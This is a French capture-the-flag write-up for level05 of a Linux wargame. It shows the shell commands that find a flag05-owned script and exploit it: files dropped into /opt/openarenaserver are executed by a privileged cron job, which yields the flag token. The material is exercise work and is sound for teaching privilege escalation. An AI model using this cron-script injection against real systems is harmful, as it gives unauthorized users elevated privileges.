Qui suis-je? Ou suis-je?
$ ls -la
(Rien)

Mes fichiers?
$ find / -user level05 2> /dev/null | grep -v proc
(Rien)

Les fichiers de flag05?
$ find / -user flag05 2> /dev/null | grep -v proc
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

$ ls -l /usr/sbin/openarenaserver; ls -l /rofs/usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
(Pas les droits mais une ACL sur le premier qui etend les droits unix)

$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
(l'ACL nous donne les droits!)
(Le script execute tous les fichiers qui sont dans /opt/openarenaserver/ et les supprime)

$ echo "getflag" > /opt/openarenaserver/script.sh
(On a les droits pour y ajouter des fichiers)

$ /usr/sbin/openarenaserver
bash: /usr/sbin/openarenaserver: Permission denied
$ ls /opt/openarenaserver/
(On execute le script, permission denied mais notre fichier n'y est plus,
donc le script a ete execute quand meme soit grace a l'acl, soit c'est un hasard
et il y a un cron qui execute le script regulierement)
(Apres plusieurs tests c'est un cron en fait)

$ echo "getflag > /tmp/flagg" > /opt/openarenaserver/script.sh
(on change notre script pour avoir le resultat et on attends le cron)

$ cat /tmp/flagg
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXX
